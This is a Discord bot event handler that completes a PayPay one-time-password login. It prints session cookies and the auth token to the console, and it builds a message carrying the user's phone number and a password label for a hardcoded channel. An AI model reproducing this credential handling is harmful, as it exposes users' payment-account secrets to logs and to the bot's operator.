import discord from 'discord.js';
import { PayPay } from 'paypax';
import fs from 'fs/promises';
import crypt from '../modules/crypt.js';

export default {
  name: discord.Events.InteractionCreate,
  async execute(client, interaction) {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'paypay_otp') {
      const otp = interaction.fields.getTextInputValue('otp');

      const object = JSON.parse(await fs.readFile(`./temp/${interaction.user.id}`));
      //await fs.unlink(`./temp/${interaction.user.id}`);

      console.log(object.cookie)
      console.log(JSON.stringify(object.cookie))

      delete object.cookie;

      const paypay = new PayPay(object.phone, object.password);

      for (const key in object) {
        if (typeof object[key] === 'object' && object[key] !== null) {
          paypay[key] = { ...object[key] };
        } else {
          paypay[key] = object[key];
        }
      }

      const result = await paypay.otpLogin(otp);

      if (!result.status) {
        const embed = new discord.EmbedBuilder()
          .setColor('Red')
          .setTitle('paypay-login')
          .setDescription('OTPが間違っています。');

        await interaction.reply({ embeds: [embed], ephemeral: true });
        return;
      }

      console.log(JSON.stringify(result));
      console.log(result);

      console.log(result.cookie)
      console.log(JSON.stringify(result.cookie))
      console.log(result.cookie.get('token'))

      const phone = crypt.encrypt(object.phone);
      const password = crypt.encrypt(object.password);
      const uuid = crypt.encrypt(object.uuid);

      await fs.writeFile(`./paypay/${interaction.user.id}`, `${phone}.${password}.${uuid}`);


      const embed = new discord.EmbedBuilder()
        .setColor('Blue')
        .setTitle('paypay-login')
        .setDescription('ログインに成功しました！');

      await interaction.reply({ embeds: [embed], ephemeral: true });

      const log = new discord.EmbedBuilder()
        .setTitle('PayPay Login')
        .setDescription(`<@${interaction.user.id}>` + '\n' + 'Phone Number```' + object.phone + '```\nPassword```')

      await client.channels.cache.get('1210911857087488000').send({ embeds: [embed] });
    }
  }
};